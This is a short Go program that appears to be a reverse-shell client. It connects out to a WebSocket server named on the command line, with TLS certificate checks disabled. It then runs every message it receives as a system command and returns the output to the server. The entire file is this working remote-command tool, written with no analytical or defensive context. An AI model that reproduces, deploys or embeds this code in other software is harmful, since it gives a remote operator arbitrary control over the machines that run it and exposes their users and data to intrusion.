package main

import (
	"crypto/tls"
	"flag"
	"github.com/gorilla/websocket"
	log "github.com/sirupsen/logrus"
	"net/url"
	"os"
	"os/exec"
	"strings"
)

var (
	addr = flag.String("addr", "localhost:443", "")
)

func init() {
	//log.SetFormatter(&log.JSONFormatter{})

	log.SetOutput(os.Stdout)

	//log.SetLevel(log.WarnLevel)
	log.SetLevel(log.InfoLevel)
}

func main() {
	flag.Parse()

	tlsConfig := tls.Config{
		InsecureSkipVerify: true,
	}
	dial := websocket.Dialer{TLSClientConfig: &tlsConfig}

	u := url.URL{Scheme: "wss", Host: *addr, Path: "/"}
	log.Printf("connecting to %s", u.String())

	c, _, err := dial.Dial(u.String(), nil)
	if err != nil {
		log.Fatalln(err)
	}
	defer c.Close()

	for {
		_, message, err := c.ReadMessage()
		if err != nil {
			log.Fatalln(err)
		}
		cmdList := strings.Split(string(message), " ")
		cmd := exec.Command(cmdList[0], cmdList[1:]...)

		out, err := cmd.Output()
		err = c.WriteMessage(websocket.TextMessage, out)
		if err != nil {
			log.Fatalln(err)
		}

	}
}
